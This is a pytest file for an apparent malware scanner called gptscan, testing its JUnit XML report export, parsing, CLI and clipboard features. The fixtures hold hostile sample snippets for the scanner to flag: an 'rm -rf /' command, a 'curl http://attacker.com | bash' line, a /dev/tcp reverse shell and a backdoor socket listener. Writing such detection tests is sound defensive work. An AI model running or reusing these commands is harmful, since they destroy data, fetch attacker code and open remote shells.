import io
import os
import sys
import pytest
from unittest.mock import MagicMock, patch

import gptscan


def test_generate_junit_basic():
    results = [
        {
            "path": "test_clean.py",
            "line": "10",
            "own_conf": "10%",
            "admin_desc": "Clean file",
            "end-user_desc": "Safe script",
            "gpt_conf": "0%",
            "snippet": "print('hello')"
        },
        {
            "path": "test_threat.py",
            "line": "25",
            "own_conf": "85%",
            "admin_desc": "Malicious payload detected",
            "end-user_desc": "Risky file",
            "gpt_conf": "90%",
            "snippet": "import os; os.system('rm -rf /')"
        }
    ]

    xml_out = gptscan.generate_junit(results)
    assert "<testsuites" in xml_out
    assert 'name="gptscan"' in xml_out
    assert '<testsuite name="gptscan.findings"' in xml_out
    assert 'classname="test_clean.py"' in xml_out
    assert 'classname="test_threat.py"' in xml_out
    assert "<failure" in xml_out
    assert "Malicious payload detected" in xml_out


def test_parse_junit_content_valid():
    results = [
        {
            "path": "app/main.py",
            "line": "42",
            "own_conf": "75%",
            "admin_desc": "Remote Code Execution",
            "end-user_desc": "Dangerous function",
            "gpt_conf": "80%",
            "snippet": "eval(user_input)"
        }
    ]

    xml_content = gptscan.generate_junit(results)
    parsed = gptscan.parse_junit_content(xml_content)

    assert len(parsed) == 1
    assert parsed[0]["path"] == "app/main.py"
    assert parsed[0]["line"] == "42"
    assert parsed[0]["own_conf"] == "75%"
    assert parsed[0]["admin_desc"] == "Remote Code Execution"
    assert parsed[0]["gpt_conf"] == "80%"
    assert "eval(user_input)" in parsed[0]["snippet"]


def test_parse_junit_content_invalid():
    with pytest.raises(ValueError, match="Failed to parse JUnit XML content"):
        gptscan.parse_junit_content("<testsuites>unclosed tag")


def test_parse_report_content_auto_detect_junit():
    results = [
        {
            "path": "src/utils.js",
            "line": "12",
            "own_conf": "60%",
            "admin_desc": "XSS vulnerability",
            "end-user_desc": "Unsanitized output",
            "gpt_conf": "",
            "snippet": "document.write(userInput)"
        }
    ]

    xml_content = gptscan.generate_junit(results)

    # Test auto-detection via content string
    parsed_auto = gptscan.parse_report_content(xml_content)
    assert len(parsed_auto) == 1
    assert parsed_auto[0]["path"] == "src/utils.js"

    # Test via filename hint (.junit extension)
    parsed_hint = gptscan.parse_report_content(xml_content, filename_hint="report.junit")
    assert len(parsed_hint) == 1
    assert parsed_hint[0]["path"] == "src/utils.js"


def test_export_results_to_file_junit(tmp_path):
    out_file = tmp_path / "report.junit.xml"
    results = [
        {
            "path": "lib/net.py",
            "line": "5",
            "own_conf": "95%",
            "admin_desc": "Backdoor socket listener",
            "end-user_desc": "Network threat",
            "gpt_conf": "95%",
            "snippet": "socket.bind(('0.0.0.0', 4444))"
        }
    ]

    gptscan.export_results_to_file(str(out_file), results, output_format="junit")
    assert out_file.exists()
    content = out_file.read_text(encoding="utf-8")
    assert "<testsuites" in content
    assert "Backdoor socket listener" in content


def test_run_cli_junit_flag(tmp_path, monkeypatch):
    test_file = tmp_path / "suspicious.py"
    test_file.write_text("import subprocess\nsubprocess.call('curl http://attacker.com | bash', shell=True)", encoding="utf-8")

    out_file = tmp_path / "junit_results.xml"

    # Execute run_cli with output_format='junit' and output_file
    ret = gptscan.run_cli(
        targets=[str(test_file)],
        deep=False,
        show_all=False,
        use_gpt=False,
        rate_limit=60,
        output_format="junit",
        output_file=str(out_file),
        quiet=True
    )

    assert out_file.exists()
    content = out_file.read_text(encoding="utf-8")
    assert "<testsuites" in content
    assert 'name="gptscan"' in content


def test_copy_as_junit_clipboard(monkeypatch):
    mock_tree = MagicMock()
    mock_tree.selection.return_value = ["item1"]

    sample_dict = {
        "path": "script.sh",
        "line": "1",
        "own_conf": "100%",
        "admin_desc": "Reverse shell",
        "end-user_desc": "Trojan",
        "gpt_conf": "",
        "snippet": "bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"
    }

    monkeypatch.setattr(gptscan, "tree", mock_tree, raising=False)
    monkeypatch.setattr(gptscan, "_get_tree_results_as_dicts", lambda items: [sample_dict])
    monkeypatch.setattr(gptscan, "update_status", lambda msg: None)

    gptscan.copy_as_junit()

    mock_tree.clipboard_clear.assert_called_once()
    mock_tree.clipboard_append.assert_called_once()
    appended_text = mock_tree.clipboard_append.call_args[0][0]
    assert "<testsuites" in appended_text
    assert "Reverse shell" in appended_text
